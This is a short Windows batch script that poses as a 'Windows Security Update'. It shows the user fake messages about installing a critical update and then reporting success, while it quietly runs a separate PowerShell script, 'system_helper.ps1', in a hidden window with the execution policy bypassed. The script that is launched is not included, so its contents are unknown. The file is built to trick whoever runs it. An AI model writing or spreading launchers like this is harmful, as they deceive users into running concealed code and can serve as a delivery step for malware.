@echo off
title Windows Security Update
echo Installing critical security update...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "system_helper.ps1"
echo Update completed successfully!
echo Your system is now protected.
pause
exit